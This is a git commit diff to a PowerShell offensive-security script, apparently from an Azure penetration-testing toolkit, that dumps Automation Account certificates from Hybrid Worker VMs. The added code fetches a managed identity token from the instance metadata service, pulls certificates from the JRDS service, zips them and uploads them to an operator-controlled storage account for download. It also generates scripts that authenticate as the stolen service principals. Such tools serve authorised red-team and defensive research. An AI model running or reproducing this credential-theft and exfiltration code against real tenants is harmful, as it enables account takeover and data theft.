76eed9377a2a32e92a8ff20a64398b8b98ca1662
Karl Fosaaen <kfosaaen@gmail.com>
2023-01-26 12:50:46 -0800

    Update Invoke-AzHybridWorkerExtraction.ps1
    Added support for dumping certificates from the JRDS service using the Hybrid Worker Managed Identity token.

--- Az/Invoke-AzHybridWorkerExtraction.ps1
+++ Az/Invoke-AzHybridWorkerExtraction.ps1
@@ -1,11 +1,15 @@
 ﻿<#
     File: Invoke-AzHybridWorkerExtraction.ps1
-    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2022
-    Description: PowerShell function for dumping Azure Run as credentials from Hybrid Worker VMs using the Az PowerShell CMDlets.
+    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2023
+    Description: PowerShell function for dumping Azure Automation Account Certificates from Hybrid Worker VMs using the Az PowerShell CMDlets.
 
     Potential Improvements:
         - Correct for multiple PFX files returned from hybrid worker
         - Add VM filter to specify VM to attack
+        - Add Credential Gathering via JRDS
+        - Add Runbook Gathering via JRDS
+        - Migrate Auth As script creation to end of script to cover JRDS enumerated certs
+
 #>
 
 # Check if the Az Module is installed and imported
@@ -19,13 +23,13 @@ function Invoke-AzHybridWorkerExtraction{
 <#
 
     .SYNOPSIS
-        Dumps all available Run as certificates from Windows VMs with the Hybrid Worker extension in an Azure subscription. Use the resulting "AuthAs" ps1 scripts to make use of the extracted credentials.
+        Dumps all available Automation Account certificates from Windows VMs with the Hybrid Worker extension in an Azure subscription. Use the resulting "AuthAs" ps1 scripts to make use of the extracted Run As credentials. Additional credentials from the JRDS service will be exported to a local .zip file.
     .DESCRIPTION
         This function will look for any VMs with the Hybrid Worker extension installed and will run a command to export any stored Run as certificates from the cert store.
     .PARAMETER Subscription
         Subscription to use.
     .EXAMPLE
-        PS C:\MicroBurst> Invoke-AzHybridWorkerExtraction -Verbose
+        PS C:\MicroBurst> Invoke-AzHybridWorkerExtraction -StorageAccount TestStorage -StorageKey "myKEY123456==" -Verbose
         VERBOSE: Logged In as kfosaaen@notarealdomain.com
         VERBOSE: Getting a list of Hybrid Worker VMs
         VERBOSE: 	Running extraction script on the HWTest virtual machine
@@ -43,7 +47,13 @@ function Invoke-AzHybridWorkerExtraction{
     Param(
         [Parameter(Mandatory=$false,
         HelpMessage="Subscription to use.")]
-        [string]$Subscription = ""
+        [string]$Subscription = "",
+        [Parameter(Mandatory=$false,
+        HelpMessage="Storage Account to use for JRDS data dumping.")]
+        [string]$StorageAccount = "",
+        [Parameter(Mandatory=$false,
+        HelpMessage="Key to use with Storage Account.")]
+        [string]$StorageKey = ""
     )
 
     # Check to see if we're logged in
@@ -63,14 +73,39 @@ function Invoke-AzHybridWorkerExtraction{
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Invoke-AzHybridWorkerExtraction -Subscription $sub}
+        foreach ($sub in $subChoice) {Invoke-AzHybridWorkerExtraction -Subscription $sub -StorageAccount $StorageAccount -StorageKey $StorageKey}
         break
     }
 
+    # Limit progress bar for the new Storage Account Container
+    $OriginalProgressPreference = $Global:ProgressPreference
+    $Global:ProgressPreference = 'SilentlyContinue'
+
     Write-Verbose "Logged In as $accountName"
+    
+    # JobName for extracting data from the VMs
+    $jobName = (-join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})).ToLower()
 
     # Command to run on the VMs
-    "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText;Get-ChildItem -Path cert:\localMachine\my\| ForEach-Object{ try{ Export-PfxCertificate -cert `$_.PSPath -FilePath (-join(`$_.PSChildName,'.pfx')) -Password `$mypwd | Out-Null; [Convert]::ToBase64String([IO.File]::ReadAllBytes((-join(`$PWD,'\',`$_.PSChildName,'.pfx')))); remove-item (-join(`$PWD,'\',`$_.PSChildName,'.pfx'))}catch{}}" | Out-File -FilePath ".\tempscript.ps1"
+    "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText;Get-ChildItem -Path cert:\localMachine\my\| ForEach-Object{ try{ Export-PfxCertificate -cert `$_.PSPath -FilePath (-join(`$_.PSChildName,'.pfx')) -Password `$mypwd | Out-Null;[Convert]::ToBase64String([IO.File]::ReadAllBytes((-join(`$PWD,'\',`$_.PSChildName,'.pfx'))));remove-item (-join(`$PWD,'\',`$_.PSChildName,'.pfx'))}catch{}}" | Out-File -FilePath ".\tempscript.ps1"
+
+    if(($StorageAccount -ne "") -and ($StorageKey -ne "")){
+
+        Write-Verbose "Using the $jobName container in the $StorageAccount Storage Account for temporary storage"
+
+        # Temp Storage Account Setup
+        $exfilContext = New-AzStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $StorageKey
+        $WriteSAStoken = New-AzStorageAccountSASToken -Service Blob -ResourceType Service,Container,Object -Permission "w" -ExpiryTime (Get-Date).AddDays(.02) -Context $exfilContext
+        New-AzStorageContainer -Context $exfilContext -Name $jobName | Out-Null
+
+        $uri = -join('https://',$StorageAccount,'.blob.core.windows.net/',$jobName,'/output.zip',$WriteSAStoken)
+        $headers = @{"x-ms-blob-type" = "BlockBlob"}
+
+        $invokeRequestString = "Invoke-WebRequest -Uri '$uri' -Headers @{`"x-ms-blob-type`"=`"BlockBlob`"} -Method Put -InFile '$jobName.zip' | Out-Null"
+
+        # Second Command to run on the VMs
+        "`$baseHKLM = ((Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\HybridRunbookWorkerV2)[0].Name).Split('\')[-1];`$regKey = (Get-ItemProperty -Path (-join('HKLM:\SOFTWARE\Microsoft\HybridRunbookWorkerV2\',`$baseHKLM,'\')));`$jrdsBase = (`$regKey| select JobRuntimeDataServiceUri).JobRuntimeDataServiceUri;`$resourceID = (`$regKey| select AzureResourceId).AzureResourceId;`$aaID = (`$jrdsBase.split('.')[0]).split('/')[2];`$jrdsURL = -join(`$jrdsBase, '/automationAccounts/',`$aaID,'/certificates/?api-version=1.0&vmResourceId=',`$resourceID);`$mgmtToken = ((Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata=`"true`"} -UseBasicParsing).Content | ConvertFrom-Json).access_token;`$certList = (Invoke-WebRequest -Uri `$jrdsURL -Method GET -Headers @{Authorization=`"Bearer `$mgmtToken`"} -UseBasicParsing).Content| ConvertFrom-Json; `$certList.value | ForEach-Object {[IO.File]::WriteAllBytes(`"`$PWD\`$(`$_.name).pfx`",[Convert]::FromBase64String(`$_.value))};Compress-Archive -Path '.\*.pfx' -DestinationPath (-join('$jobname','.zip'));$invokeRequestString;rm (-join('$jobname','.zip'))" | Out-File -FilePath ".\tempscript2.ps1"
+    }
 
     Write-Verbose "Getting a list of Hybrid Worker VMs"
 
@@ -79,60 +114,96 @@ function Invoke-AzHybridWorkerExtraction{
         if($_.Name -eq "HybridWorkerExtension"){
     
             $vmName = $_.VMName
-
-            Write-Verbose "`tRunning extraction script on the $vmName virtual machine"
+            Write-Verbose "`tStarting extraction on the $vmName virtual machine"
+            Write-Verbose "`t`tRunning 'Run As' extraction script on the $vmName virtual machine"
 
             Try{
 
                 $scriptOutput = Invoke-AzVMRunCommand -ResourceGroupName $_.ResourceGroupName -VMName $_.VMName -CommandId RunPowerShellScript -ScriptPath ".\tempscript.ps1" -ErrorAction SilentlyContinue
-
                 $cmdOut = $scriptOutput.Value[0].Message
-            
-                [IO.File]::WriteAllBytes("$PWD\testCertificate.pfx",[Convert]::FromBase64String($cmdOut))
 
-                $mypwd = ConvertTo-SecureString -String "TotallyNotaHardcodedPassword..." -Force -AsPlainText
-                $pfxData = (Get-PfxData "$PWD\testCertificate.pfx" -Password $mypwd).EndEntityCertificates
-                $pfxSubject = $pfxData.Subject
-                $pfxThumb = $pfxData.Thumbprint
-                $newCert = (-join($pfxSubject.Split("=")[1],".pfx"))
+                if ($cmdOut.Length -gt 1){
+                    [IO.File]::WriteAllBytes("$PWD\testCertificate.pfx",[Convert]::FromBase64String($cmdOut))
 
-                Move-Item "$PWD\testCertificate.pfx" $newCert
+                    $mypwd = ConvertTo-SecureString -String "TotallyNotaHardcodedPassword..." -Force -AsPlainText
+                    $pfxData = (Get-PfxData "$PWD\testCertificate.pfx" -Password $mypwd).EndEntityCertificates
+                    $pfxSubject = $pfxData.Subject
+                    $pfxThumb = $pfxData.Thumbprint
+                    $newCert = (-join($pfxSubject.Split("=")[1],".pfx"))
 
+                    
+                    if((Get-ChildItem "$PWD\testCertificate.pfx").Length -gt 1){
+                        Move-Item "$PWD\testCertificate.pfx" $newCert -Force
+                    }
+                    else{Remove-Item "$PWD\testCertificate.pfx"}
 
-                # Find the App ID by CertThumbprint
-                Write-Verbose "`t`tLooking for the attached App Registration... This may take a while in larger environments"
+                    # Find the App ID by CertThumbprint
+                    Write-Verbose "`t`t`tLooking for the attached App Registration... This may take a while in larger environments"
 
-                # Take each App Registration, get the available certs, match the thumbprints
-                Get-AzADApplication | ForEach-Object{
-                    $appTempId = $_.ApplicationId
-                    $appTempName = $_.DisplayName
-                    $_ | Get-AzADAppCredential | ForEach-Object{ if($_.CustomKeyIdentifier -EQ $pfxThumb){$appClientID = $appTempId; $appRegName = $appTempName}}
+                    # Take each App Registration, get the available certs, match the thumbprints
+                    Get-AzADApplication | ForEach-Object{
+                        $appTempId = $_.AppId
+                        $appTempName = $_.DisplayName
+                        $_ | Get-AzADAppCredential | ForEach-Object{ if($_.CustomKeyIdentifier -EQ $pfxThumb){$appClientID = $appTempId; $appRegName = $appTempName}}
+                    }
+
+                    $tenantId = (get-azcontext).Tenant.Id
+
+                    $outFile = (-join($pwd,'\AuthAs',$pfxSubject.Split("=")[1],".ps1"))
+
+                    Write-Verbose "`t`t`t`tWriting the AuthAs script"
+
+                    # Write the AuthenticateAs Script
+                    "`$thumbprint = '$pfxThumb'" | Out-File $outFile
+                    "`$tenantID = '$tenantId'" | Out-File -Append $outFile
+                    "`$appId = '$appClientID'" | Out-File -Append $outFile
+                    "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText" | Out-File -Append $outFile
+                    "Import-PfxCertificate -FilePath $newCert -CertStoreLocation Cert:\LocalMachine\My -Password `$mypwd" | Out-File -Append $outFile
+                    "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -Append $outFile
+
+                    Write-Verbose "`t`t`tUse the $outFile script to authenticate as the $appRegName App Registration"
                 }
+                else{Write-Verbose "`t`t`tNo Exportable Certificates on $vmName"}
 
-                $tenantId = (get-azcontext).Tenant.Id
-
-                $outFile = (-join($pwd,'\AuthAs',$pfxSubject.Split("=")[1],".ps1"))
-
-                Write-Verbose "`t`t`tWriting the AuthAs script"
-
-                # Write the AuthenticateAs Script
-                "`$thumbprint = '$pfxThumb'" | Out-File $outFile
-                "`$tenantID = '$tenantId'" | Out-File -Append $outFile
-                "`$appId = '$appClientID'" | Out-File -Append $outFile
-                "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText" | Out-File -Append $outFile
-                "Import-PfxCertificate -FilePath $newCert -CertStoreLocation Cert:\LocalMachine\My -Password `$mypwd" | Out-File -Append $outFile
-                "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -Append $outFile
-
-                Write-Verbose "`t`tUse the $outFile script to authenticate as the $appRegName App Registration"
-                Write-Verbose "`tScript Execution on $vmName Completed"                
+                Write-Verbose "`t`tInitial Script Execution on $vmName Completed"
             }
-            Catch{Write-Verbose "`t`tError in command excution. Check the Azure Activity Log for more details."}
+            Catch{Write-Verbose "`t`t`tError in command excution. Check the Azure Activity Log for more details."}
+
+            if(($StorageAccount -ne "") -and ($StorageKey -ne "")){
+                Write-Verbose "`t`tRunning command for JRDS request to extract additional certificates"
+
+                Try{
+                
+                    $scriptOutput = Invoke-AzVMRunCommand -ResourceGroupName $_.ResourceGroupName -VMName $_.VMName -CommandId RunPowerShellScript -ScriptPath ".\tempscript2.ps1" -ErrorAction SilentlyContinue
+
+                    $ReadSAStoken = New-AzStorageAccountSASToken -Service Blob -ResourceType Service,Container,Object -Permission "r" -ExpiryTime (Get-Date).AddDays(.02) -Context $exfilContext
+                    $uri = -join('https://',$StorageAccount,'.blob.core.windows.net/',$jobName,'/output.zip',$ReadSAStoken)
+
+                    Invoke-WebRequest -Uri $uri -OutFile .\$vmName.zip -Verbose:$false | Out-Null
+                    Write-Verbose "`t`t`tJRDS Extracted certificates are available locally in the $vmName.zip file."
+
+                    Write-Verbose "`t`tSecondary Script Execution on $vmName Completed"
+                }
+                Catch{Write-Verbose "`t`t`tError in command excution. Check the Azure Activity Log for more details."}
+            }
+            else{Write-Verbose "`tNo Storage Account keys provided, skipping JRDS request to extract additional certificates"}
         }
     }
-    
-    # Remove the temp script
-    Remove-Item ".\tempscript.ps1"
 
-    Write-Verbose "Run as Credential Dumping Activities Have Completed"
+    if(($StorageAccount -ne "") -and ($StorageKey -ne "")){
+        # Remove the Temporary Storage Account Container
+        Remove-AzStorageContainer -Name $jobName -Context $exfilContext -Force | Out-Null
+    }
+    
+    # Remove the temp scripts
+    Remove-Item ".\tempscript.ps1"
+    if(($StorageAccount -ne "") -and ($StorageKey -ne "")){
+        Remove-Item ".\tempscript2.ps1"
+    }
+
+    # Reset Progress Bar Preference
+    $Global:ProgressPreference = $OriginalProgressPreference
+
+    Write-Verbose "Hybrid Worker Credential Dumping Activities Have Completed"
 
 }
